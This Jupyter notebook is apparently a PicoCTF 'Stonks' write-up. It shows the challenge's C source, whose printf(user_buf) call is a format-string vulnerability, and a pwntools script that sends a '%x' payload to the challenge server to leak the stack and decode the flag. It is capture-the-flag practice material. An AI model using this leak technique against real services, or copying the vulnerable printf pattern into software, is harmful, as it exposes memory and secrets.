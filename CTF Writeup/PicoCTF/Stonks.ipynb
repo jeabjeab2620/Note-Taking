{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Reference: https://ctftime.org/writeup/28935"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "/*vuln.c*/\n",
    "\n",
    "int buy_stonks(Portfolio *p) {\n",
    "    if (!p) {\n",
    "        return 1;\n",
    "    }\n",
    "    char api_buf[FLAG_BUFFER];\n",
    "    FILE *f = fopen(\"api\",\"r\");\n",
    "    if (!f) {\n",
    "        printf(\"Flag file not found. Contact an admin.\\n\");\n",
    "        exit(1);\n",
    "    }\n",
    "    fgets(api_buf, FLAG_BUFFER, f);\n",
    "\n",
    "    int money = p->money;\n",
    "    int shares = 0;\n",
    "    Stonk *temp = NULL;\n",
    "    printf(\"Using patented AI algorithms to buy stonks\\n\");\n",
    "    while (money > 0) {\n",
    "        shares = (rand() % money) + 1;\n",
    "        temp = pick_symbol_with_AI(shares);\n",
    "        temp->next = p->head;\n",
    "        p->head = temp;\n",
    "        money -= shares;\n",
    "    }\n",
    "    printf(\"Stonks chosen\\n\");\n",
    "\n",
    "    // TODO: Figure out how to read token from file, for now just ask\n",
    "\n",
    "    char *user_buf = malloc(300 + 1);\n",
    "    printf(\"What is your API token?\\n\");\n",
    "    scanf(\"%300s\", user_buf);\n",
    "    printf(\"Buying stonks with token:\\n\");\n",
    "    printf(user_buf);\n",
    "\n",
    "    // TODO: Actually use key to interact with API\n",
    "\n",
    "    view_portfolio(p);\n",
    "\n",
    "    return 0;\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# import pwntools\n",
    "from pwn import *\n",
    "\n",
    "# string to write to\n",
    "s = \"\"\n",
    "\n",
    "# open up remote connection\n",
    "r = remote('mercury.picoctf.net', 53437)\n",
    "\n",
    "# get to vulnerability\n",
    "r.recvuntil(\"View my\")\n",
    "r.send(\"1\\n\")\n",
    "r.recvuntil(\"What is your API token?\\n\")\n",
    "\n",
    "# send string to print stack\n",
    "r.send(\"%x\" + \"-%x\"*40 + \"\\n\")\n",
    "\n",
    "# receive until the line we want\n",
    "r.recvline()\n",
    "\n",
    "# read in line\n",
    "x = r.recvline()\n",
    "\n",
    "# remove unwanted components\n",
    "x = x[:-1].decode()\n",
    "\n",
    "# parse to characters\n",
    "for i in x.split('-'):\n",
    "    if len(i) == 8:\n",
    "        a = bytearray.fromhex(i)\n",
    "\n",
    "        for b in reversed(a):\n",
    "            if b > 32 and b < 128:\n",
    "                s += chr(b)\n",
    "\n",
    "# print string\n",
    "print(s)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.10.5 64-bit",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.5"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "ee78a3b3a05f8313430908c8b65748877975fa955d039643c67469379c7c2248"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
